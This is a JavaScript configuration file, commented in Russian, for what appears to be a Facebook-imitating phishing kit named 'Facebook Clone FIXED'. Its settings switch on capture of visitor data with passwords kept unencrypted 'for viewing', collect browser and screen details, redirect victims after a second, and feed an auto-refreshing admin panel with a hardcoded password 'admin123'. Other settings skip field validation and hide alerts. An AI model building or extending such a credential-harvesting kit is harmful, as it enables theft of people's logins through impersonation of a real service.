// config.js - НАСТРОЙКИ ПРОЕКТА (ИСПРАВЛЕННЫЕ)

const CONFIG = {
    // Основные настройки
    PROJECT_NAME: 'Facebook Clone FIXED',
    VERSION: '3.0.0',
    
    // Настройки сбора данных - ВСЕ ВКЛЮЧЕНО!
    COLLECT_DATA: true,
    SAVE_TO_LOCALSTORAGE: true,
    SAVE_TO_FILE: false,
    SEND_TO_SERVER: false,
    
    // Настройки сервера
    SERVER_URL: '',
    
    // Настройки безопасности
    ENCRYPT_PASSWORDS: false, // Отключено для просмотра
    MAX_LOG_ENTRIES: 1000,
    
    // Настройки интерфейса - МИНИМАЛЬНЫЕ ЗАДЕРЖКИ
    REDIRECT_DELAY: 1000, // 1 секунда
    LOADING_DISPLAY_TIME: 800, // 0.8 секунды
    
    // Настройки админки
    ADMIN_PASSWORD: 'admin123', // Пароль для админки
    AUTO_REFRESH_DATA: true,
    REFRESH_INTERVAL: 3000, // 3 секунды
    
    // Дополнительные настройки
    COLLECT_BROWSER_INFO: true,
    COLLECT_SCREEN_INFO: true,
    COLLECT_LOCATION_INFO: false,
    
    // Режим отладки
    DEBUG_MODE: true,
    
    // Фиксы
    AUTO_CREATE_ACCOUNT: true,
    SKIP_VALIDATION: true, // Пропустить проверку полей
    HIDE_ALERTS: true, // Скрыть все предупреждения
    
    // Цвета
    COLORS: {
        primary: '#1877f2',
        success: '#42b72a',
        danger: '#ff4444',
        warning: '#ffbb33',
        info: '#33b5e5'
    }
};

// Экспортируем конфиг
window.CONFIG = CONFIG;

// Для быстрой проверки
console.log('CONFIG загружен:', CONFIG.PROJECT_NAME, 'v' + CONFIG.VERSION);
